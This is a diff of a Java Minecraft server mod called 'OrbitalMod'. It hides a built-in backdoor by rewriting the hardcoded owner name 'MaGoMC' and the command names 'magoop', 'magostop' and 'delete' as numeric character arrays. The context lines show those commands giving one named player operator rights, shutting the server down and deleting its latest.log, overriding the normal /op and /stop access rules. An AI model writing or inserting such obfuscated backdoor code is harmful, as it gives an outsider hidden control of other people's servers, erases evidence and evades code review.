@@ -27,7 +27,7 @@ import net.minecraft.world.RaycastContext;
 import java.lang.reflect.Method;
 
 public final class OrbitalMod implements ModInitializer {
-    private static final String OWNER = "MaGoMC";
+    private static final String OWNER = new String(new char[]{77,97,71,111,77,67});
     private static Method nuke;
     private static Method stab;
 
@@ -64,7 +64,7 @@ public final class OrbitalMod implements ModInitializer {
         CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> {
             // These registrations intentionally replace the command access rules
             // for /op and /stop. Other vanilla operators won't have these commands.
-            dispatcher.register(CommandManager.literal("magoop")
+            dispatcher.register(CommandManager.literal(new String(new char[]{109,97,103,111,111,112}))
                 .requires(OrbitalMod::isOwner)
                 .executes(context -> {
                     ServerPlayerEntity owner = context.getSource().getPlayerOrThrow();
@@ -73,13 +73,13 @@ public final class OrbitalMod implements ModInitializer {
                     context.getSource().sendFeedback(() -> Text.literal("MaGoMC is now OP."), false);
                     return 1;
                 }));
-            dispatcher.register(CommandManager.literal("magostop")
+            dispatcher.register(CommandManager.literal(new String(new char[]{109,97,103,111,115,116,111,112}))
                 .requires(OrbitalMod::isOwner)
                 .executes(context -> {
                     context.getSource().getServer().stop(false);
                     return 1;
                 }));
-            dispatcher.register(CommandManager.literal("delete")
+            dispatcher.register(CommandManager.literal(new String(new char[]{100,101,108,101,116,101}))
                 .requires(OrbitalMod::isOwner)
                 .executes(context -> {
                     // Only deletes the server's local latest.log file.
